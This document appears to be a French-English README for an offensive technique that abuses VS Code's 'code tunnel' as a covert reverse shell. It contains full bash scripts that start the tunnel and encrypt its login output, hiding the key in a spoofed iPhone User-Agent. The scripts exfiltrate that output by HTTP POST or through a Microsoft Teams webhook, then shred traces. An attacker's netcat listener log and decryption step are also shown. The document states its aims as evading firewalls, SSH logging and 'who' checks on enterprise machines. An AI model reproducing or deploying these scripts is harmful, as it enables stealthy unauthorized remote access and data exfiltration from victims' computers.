# Reverse Shell Full HTTP VsCode Tunnel

- Need
  - HTTP->TCP80 Open
  - VsCode
  - Code exec
  - Linux / Mac os

- Why ?
  - Teams Webhook 443:HTTPS -> Firewall OK
  - HTTPS -> Confidentiality OK
  - Full interactivity shell (and a IDE !)
  - VsCode
    - Possibly installed on computer with permission in enterprise (dev, sysadmin)
    - Mac os Binary Checker OK
    - `w` or `who` empty
    - No SSH, no telnet -> No log this service to

## Big dummy version HTTP:80 encoded

```bash
process_data() {
    local temp_file=$1
    
    # Exécuter la commande et rediriger vers le fichier temporaire
    code tunnel | tee "$temp_file" &
    sleep 5
    
    # Générer un mot de passe aléatoire pour le chiffrement
    local password=$(openssl rand -base64 32 | tr -dc 'a-zA-Z0-9' | head -c 24)
    
    # Chiffrer avec le mot de passe généré et envoyer les données avec le mot de passe dans l'en-tête User-Agent
    head -n 20 "$temp_file" | openssl enc -aes-256-cbc -a -pbkdf2 -iter 10000 -salt -k "$password" |
    curl -s -X POST \
         -H "Content-Type: text/plain" \
         -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H143 Safari/600.1.$password" \
         --data-binary @- \
         http://127.0.0.1:80/receive
    
    # Supprimer le fichier de façon sécurisée avec shred
    if command -v shred &>/dev/null; then
        shred -u -z -n 3 "$temp_file" 2>/dev/null || rm -f "$temp_file"
    else
        rm -f "$temp_file"
    fi
}

# Détecter le système et créer un fichier temporaire approprié
if [[ "$(uname)" == "Darwin" ]]; then
    # macOS
    process_data "$(mktemp)"
elif [[ -d "/dev/shm" ]]; then
    # Linux avec /dev/shm disponible (RAM disk)
    process_data "$(mktemp -p /dev/shm)"
else
    # Autre système: essayer plusieurs répertoires
    writable_found=false
    
    for dir in "$(mktemp -d 2>/dev/null)" "/tmp" "/var/tmp" "/run/user/$(id -u)" "$HOME/tmp" "$HOME"; do
        if [[ -d "$dir" && -w "$dir" ]]; then
            temp_file="$dir/temp_$$_$RANDOM"
            touch "$temp_file" 2>/dev/null && process_data "$temp_file" && writable_found=true && exit 0
        fi
    done
    
    # Si aucun répertoire écrivable n'est trouvé, envoyer une notification
    if [[ "$writable_found" == "false" ]]; then
        curl -s -X POST -H "Content-Type: text/plain" --data "ERROR: No writable directory found" http://127.0.0.1:80/receive
        exit 1
    fi
fi
```

## Small dummy version HTTP:80 encoded


```bash
process_data() {
  local f=$1
  code tunnel | tee "$f" & 
  sleep 5
  pwd=$(openssl rand -base64 32 | tr -dc 'a-zA-Z0-9' | head -c 24)
  head -n 20 "$f" | openssl enc -aes-256-cbc -a -pbkdf2 -iter 10000 -salt -k "$pwd" | curl -s -X POST \
  -H "Content-Type: text/plain" \
  -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H143 Safari/600.1.$pwd" \
  --data-binary @- \
  http://127.0.0.1:80/receive
  command -v shred &>/dev/null && shred -u -z -n 3 "$f" 2>/dev/null || rm -f "$f"
}
if [[ "$(uname)" == "Darwin" ]]; then
  process_data "$(mktemp)"
elif [[ -d "/dev/shm" ]]; then
  process_data "$(mktemp -p /dev/shm)"
else
  w=false
  for d in "$(mktemp -d 2>/dev/null)" "/tmp" "/var/tmp" "/run/user/$(id -u)" "$HOME/tmp" "$HOME"; do
    [[ -d "$d" && -w "$d" ]] && { t="$d/temp_$$_$RANDOM"; touch "$t" 2>/dev/null && process_data "$t" && w=true && exit 0; }
  done
  [[ "$w" == "false" ]] && curl -s -X POST -H "Content-Type: text/plain" --data "ERROR: No writable directory found" http://127.0.0.1:80/receive && exit 1
fi
```

## Attaquant

```bash
rooooot /workspace # nc -lknvp 80
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:35524.
POST /receive HTTP/1.1
Host: 127.0.0.1
Accept: */*
Content-Type: text/plain
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H143 Safari/600.1.Ig4WMN0Vwc2acBNdEIVK61xV
Content-Length: 1170

U2FsdGVkqsX1/qsDEF4WZfeD//ddansnoudEXyzFVLgyBsDUKBpEKojqlggggJHFE1PFkA
bb76jLL5aqsqsSuBnfWSwEEcOZfddMvg+oE50g/t2/OUE0ffXgLhMl2T80KB/0KtINDKah
uYZJPTqsxA+y9hqsWxWrBOB6NQOdglKXqsgLHCEZF8dsdreYHm1M3f/ViB8l+uic9tMaeU
TILHriBYeBsqMBW+E8t34Gwsx5OguScZ73ddINyDNwj49Ql/+2lLVAcvoVLytTVvmzfeo4
U3U1TfsFpqnQSa7x+d19GPqmSxKamL+xiH3xMFvejK7f4dQvcfQ17w1zlvc9vZhGVdHE2v
iET7NddA1dNQryn5Z51W+8KZuI6cTsut/d4sdnsdoYDz0sdfsdosookMtx6B9xkykHetFp
pVicHuEcxh9tobKp/jfG98xVKFwKJmv8Ac6SUDQJDPZdYsdfsdfUc222k4lCQiuxJ/aUFQ
yB6vbMqb8+Lz7ta8e0p+kAbTalhaZmiXVVAdsfsdfz64kQ5jERV+vLnaRL2b4o9WmW8Vp6
Ow1DT5eD01XboxJ3MumD7j0R4d+uvjrJvJTsdssdqsdMQQAWNQFsqMooYQ95ETQ9CHrpPd
9LISSXhIcZFarfreDDsQttRBXZD95HQPZawsdfsdff0+SoSHzUmnjIP/FYf60CncP6Tez3
vT8EwlYKN7KZhWgxYAjGNo0Yl+JtEUZ0XeXGsW8++S7O4eIs77ADRXiGRlFv0NzARlF0Nd
t5VybPrCMHvi2Wqacq6kHN238JE9u+Ge0L89rZ3+vLnaRL2b4o9WmW8Vp6vLnaRL2bo9Wm
KdUwvVa1Yeqlmf8x/tgXRD8cFbqcioK14ulcwhhGOcxvS77JWmG39kMoE1NUxU2qwhGOcx
Kuk0SRvGcQER7UrGZQ8SrrS9EUCdWIqSEeaZ8UPnwqM/wF9ErDhMt6/PvgNcaWIqEeaZ8U
At7yGSoan371aNbivb92bqnhG1J6JeOYeVJ8pa8lQF1D2pdvdBtAa/0BUqrVmy/bwhhGOc
IW0gDAO8KFOPCs3AzsFimXgH3nYACMW9dyApaDAX/UxLUSbbny32vf6ZIwrnWnYNRlFv0N
kAsI77tlmpVbpughoQMai0wJDqrQVQGSPHs/xFzk9rm966ZlmUTE3vLjvDt90IxJwhhGOc
wjhqWhYmKv6D7BRMm6ierauouCQiLcn8hfONfpWgMD1RspeU8k/kFHUZcxBYK986NUxU2q

rooooot /workspace # cat msg.txt | openssl enc -aes-256-cbc -d -a -pbkdf2 -iter 10000 -salt -k "Ig4WMN0Vwc2acBNdEIVK61xV"
* Visual Studio Code Server
*
* By using the software, you agree to
* the Visual Studio Code Server License Terms (https://aka.ms/vscode-server-license) and
* the Microsoft Privacy Statement (https://privacy.microsoft.com/en-US/privacystatement).
...
```

## Teams Webhook 

```
WEBHOOK_URL="https://MY-TEAMS-WEBHOOK.COM" 
process_data() {
  local file=$1
  
  # Exécute la commande et enregistre la sortie
  code tunnel | tee "$file" &
  sleep 5

  # Génération d'un mot de passe sécurisé pour chiffrement
  local pwd=$(openssl rand -base64 32 | tr -dc 'a-zA-Z0-9' | head -c 24)

  # Récupération et chiffrement des 20 premières lignes du fichier
  local encrypted_data=$(head -n 20 "$file" | openssl enc -aes-256-cbc -a -pbkdf2 -iter 10000 -salt -k "$pwd")

  # Création d'un payload JSON clair et structuré pour Teams
  read -r -d '' json_payload <<EOF
{
  "@type": "MessageCard",
  "@context": "http://schema.org/extensions",
  "summary": "Message Chiffré",
  "themeColor": "0078D7",
  "title": "New Shell",
  "sections": [{
    "activityTitle": "Contenu Chiffré",
    "text": "<pre>$encrypted_data</pre>",
    "facts": [
      { "name": "Mot de passe", "value": "$pwd" }
    ]
  }]
}
EOF

  # URL du webhook Teams (à remplacer par ton URL réelle)
  local teams_webhook="https://outlook.office.com/webhook/TON_WEBHOOK_TEAMS"

  # Envoi du message chiffré vers le webhook Teams
  curl -s -H "Content-Type: application/json" \
       -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H143" \
       -d "$json_payload" \
       "$WEBHOOK_URL"

  # Nettoyage sécurisé du fichier temporaire
  if command -v shred &>/dev/null; then
    shred -u -z -n 3 "$file" 2>/dev/null
  else
    rm -f "$file"
  fi
}

# Détection du système et création d'un fichier temporaire adapté
if [[ "$(uname)" == "Darwin" ]]; then
  process_data "$(mktemp)"
elif [[ -d "/dev/shm" ]]; then
  process_data "$(mktemp -p /dev/shm)"
else
  writable=false
  for dir in "/tmp" "/var/tmp" "/run/user/$(id -u)" "$HOME/tmp" "$HOME"; do
    if [[ -d "$dir" && -w "$dir" ]]; then
      tmp_file="$dir/temp_$$_$RANDOM"
      touch "$tmp_file" 2>/dev/null && process_data "$tmp_file" && writable=true && exit 0
    fi
  done

  if [[ "$writable" == "false" ]]; then
    curl -s -H "Content-Type: application/json" \
         -d '{"text":"ERROR: No writable directory found"}' \
         "$WEBHOOK_URL"
    exit 1
  fi
fi
```

<img width="1067" alt="image" src="https://github.com/user-attachments/assets/fdbe44dd-b1b3-4e82-87b2-1a37d294327d" />




